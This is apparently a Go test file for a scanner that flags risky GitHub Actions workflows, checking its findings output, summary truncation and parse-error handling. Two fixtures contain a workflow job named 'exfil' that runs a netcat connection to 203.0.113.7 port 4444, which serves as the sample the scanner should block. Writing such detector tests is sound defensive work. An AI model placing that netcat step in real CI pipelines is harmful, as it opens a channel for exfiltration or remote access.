package main

import (
	"bytes"
	"strings"
	"testing"
)

// A workflow that blocks, for exercising the scan path end to end.
const blockingWorkflow = `on:
  push:
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: nc 203.0.113.7 4444 < /dev/null
`

// A workflow with nothing wrong in it.
const cleanWorkflow = `on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make test
`

// scanArgs runs the whole command and returns what it wrote plus the exit code.
func scanArgs(t *testing.T, stdin string, args ...string) (stdout, stderr string, code int) {
	t.Helper()
	var out, errBuf bytes.Buffer
	code = run(args, strings.NewReader(stdin), &out, &errBuf)
	return out.String(), errBuf.String(), code
}

// A finding reaches the output, with the tier, the rule and the location.
func TestScanReportsFindings(t *testing.T) {
	stdout, _, _ := scanArgs(t, blockingWorkflow, "scan", "-")

	if !strings.Contains(stdout, "scanned 1 workflow") {
		t.Errorf("missing the scanned count:\n%s", stdout)
	}
	if !strings.Contains(stdout, "BLOCK") {
		t.Errorf("missing the BLOCK tier:\n%s", stdout)
	}
	if !strings.Contains(stdout, "PPE-004") {
		t.Errorf("missing the rule id:\n%s", stdout)
	}
	if !strings.Contains(stdout, "in job exfil") {
		t.Errorf("missing the job context:\n%s", stdout)
	}
}

// A clean workflow reports a clean count and says so, rather than printing an
// empty list and leaving the reader to work out whether that means zero findings
// or a failure to run.
func TestScanCleanWorkflow(t *testing.T) {
	stdout, _, _ := scanArgs(t, cleanWorkflow, "scan", "-")

	if !strings.Contains(stdout, "0 blocks, 0 warnings") {
		t.Errorf("missing the clean count:\n%s", stdout)
	}
	if strings.Contains(stdout, "BLOCK") {
		t.Errorf("a clean workflow should not print BLOCK:\n%s", stdout)
	}
}

// Blocks sort above warnings, so the thing that blocks a merge is never below
// the fold behind a list of warnings.
func TestScanSortsBlocksFirst(t *testing.T) {
	// One workflow that both blocks and warns, so the two tiers appear together.
	workflow := `on:
  push:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: nc 203.0.113.7 4444 < /dev/null
`
	stdout, _, _ := scanArgs(t, workflow, "scan", "-")

	// Search for the tier markers as they appear on a finding line, not for the
	// bare words. "warn" is a substring of "warning" in the summary line, which
	// is above every finding and made this assert the wrong thing.
	blockAt := strings.Index(stdout, "\nBLOCK")
	warnAt := strings.Index(stdout, "\nwarn ")
	if blockAt < 0 || warnAt < 0 {
		t.Fatalf("expected both tiers:\n%s", stdout)
	}
	if blockAt > warnAt {
		t.Errorf("BLOCK should come first:\n%s", stdout)
	}
}

// A message is one long paragraph, and eleven of them in a row is a wall. The
// listing has to be short enough to scan.
func TestSummariseShortensLongMessages(t *testing.T) {
	long := strings.Repeat("word ", 60)

	got := summarise(long)
	if len(got) > 130 {
		t.Errorf("summarise returned %d characters, want it much shorter:\n%q", len(got), got)
	}
	if !strings.HasSuffix(got, "...") {
		t.Errorf("a truncated summary should end with an ellipsis, got %q", got)
	}
}

// Cutting at the first sentence rather than at a fixed width keeps the summary
// readable, which matters more than an exactly even column.
func TestSummarisePrefersSentenceBoundary(t *testing.T) {
	got := summarise("203.0.113.7 is a bare IP address in a script. " + strings.Repeat("more ", 80))
	if got != "203.0.113.7 is a bare IP address in a script." {
		t.Errorf("summarise = %q, want the first sentence only", got)
	}
}

func TestSummariseLeavesShortMessagesAlone(t *testing.T) {
	const msg = "a short message"
	if got := summarise(msg); got != msg {
		t.Errorf("summarise = %q, want it unchanged", got)
	}
}

// A workflow that will not parse is a workflow that was not checked. Reporting
// that as a clean run would be the worst possible answer, so it goes to stderr
// and is never folded into the finding counts.
func TestScanReportsParseErrors(t *testing.T) {
	broken := "on:\n  push:\njobs:\n  j:\n   bad indent here\n"

	stdout, stderr, _ := scanArgs(t, broken, "scan", "-")

	if stderr == "" {
		t.Error("a parse error should reach stderr")
	}
	if !strings.Contains(stderr, "broken") && !strings.Contains(stderr, "must be a mapping") {
		t.Errorf("stderr does not explain the failure: %s", stderr)
	}
	// Zero findings is the honest count here, since the only workflow was the one
	// that failed. What must not happen is a summary that looks like a completed
	// scan, so the gap has to be stated on the summary line itself.
	if !strings.Contains(stdout, "could not be checked") {
		t.Errorf("the summary does not say a file went unchecked:\n%s", stdout)
	}
}

// One broken workflow must not hide the findings in every other one. They are
// reported together rather than aborting at the first error.
func TestScanContinuesPastABrokenWorkflow(t *testing.T) {
	dir := writeTree(t, map[string]string{
		".github/workflows/good.yml":   blockingWorkflow,
		".github/workflows/broken.yml": "on:\n  push:\njobs:\n  j:\n   bad indent here\n",
	})

	stdout, stderr, _ := scanArgs(t, "", "scan", dir)

	if !strings.Contains(stdout, "BLOCK") {
		t.Errorf("the good workflow's finding was lost:\n%s", stdout)
	}
	if !strings.Contains(stderr, "must be a mapping") {
		t.Errorf("the broken workflow was not reported: %s", stderr)
	}
}

// An unreadable file is counted as skipped rather than named, so a repository
// root full of unrelated YAML does not bury the output.
func TestScanReportsSkippedCount(t *testing.T) {
	dir := writeTree(t, map[string]string{
		".github/workflows/ci.yml":   cleanWorkflow,
		".github/workflows/notes.md": "not a workflow",
	})

	stdout, _, _ := scanArgs(t, "", "scan", dir)
	if !strings.Contains(stdout, "skipped 1 file") {
		t.Errorf("missing the skipped count:\n%s", stdout)
	}
}

// A scan that found nothing at all says so plainly rather than printing a
// summary and an empty list.
func TestScanEmptyDirectory(t *testing.T) {
	dir := writeTree(t, map[string]string{"README.md": "docs"})

	stdout, _, _ := scanArgs(t, "", "scan", dir)
	if !strings.Contains(stdout, "nothing to check") {
		t.Errorf("missing the empty result message:\n%s", stdout)
	}
}

// A missing path is a usage error and says which path.
func TestScanMissingPath(t *testing.T) {
	_, stderr, code := scanArgs(t, "", "scan", "no-such-directory")
	if code != exitUsage {
		t.Errorf("exit = %d, want %d", code, exitUsage)
	}
	if !strings.Contains(stderr, "no-such-directory") {
		t.Errorf("stderr does not name the path: %s", stderr)
	}
}
